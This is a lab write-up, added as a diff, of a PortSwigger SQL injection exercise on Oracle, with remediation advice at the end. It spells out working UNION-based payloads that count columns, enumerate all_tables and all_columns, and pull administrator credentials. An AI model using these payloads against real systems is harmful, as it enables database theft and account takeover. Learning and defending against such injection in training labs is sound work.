@@ -1,0 +1,44 @@
+Lab 6: SQL Injection - Listing Database Contents on Oracle
+Platform: PortSwigger Web Security Academy
+Level: Practitioner
+Category: SQL Injection - Examining the Database
+Status: ✅ Solved
+
+Objective
+List all tables on an Oracle database, find the users table, and extract administrator credentials.
+
+Key Concept
+On Oracle, table info is stored in all_tables and column info in all_columns (not information_schema).
+
+Steps to Solve
+Step 1 — Confirm 2 columns exist:
+' ORDER BY 2--
+Step 2 — List all tables (Oracle syntax):
+' UNION SELECT table_name,NULL FROM all_tables--
+Found a table like USERS_ABCXYZ
+Step 3 — List columns in that table:
+' UNION SELECT column_name,NULL FROM all_columns WHERE table_name='USERS_ABCXYZ'--
+Found: USERNAME_ABC, PASSWORD_ABC
+Step 4 — Extract credentials:
+' UNION SELECT USERNAME_ABC,PASSWORD_ABC FROM USERS_ABCXYZ--
+Got administrator password ✅
+Step 5 — Logged in as administrator ✅
+
+Tool Used
+
+Burp Suite (Repeater)
+Browser
+
+
+Oracle vs Non-Oracle Comparison
+TaskNon-OracleOracleList tablesinformation_schema.tablesall_tablesList columnsinformation_schema.columnsall_columnsDummy tableNot neededFROM dual
+
+Impact
+Critical — Full credential extraction and account takeover.
+
+Remediation
+
+Parameterized queries
+Restrict Oracle user privileges
+Hash passwords with bcrypt/Argon2
+ShareContentpdfpdf
